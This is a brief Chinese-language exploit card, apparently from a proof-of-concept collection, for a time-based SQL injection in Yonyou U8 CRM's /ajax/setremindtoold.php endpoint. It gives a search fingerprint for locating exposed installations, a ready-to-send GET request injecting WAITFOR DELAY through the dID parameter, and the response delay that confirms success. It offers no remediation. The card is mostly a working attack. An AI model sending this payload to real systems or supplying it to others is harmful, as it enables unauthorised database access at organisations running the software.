# 用友U8CRMsetremindtooldSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title="用友U8CRM"`
- **请求**：`GET /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s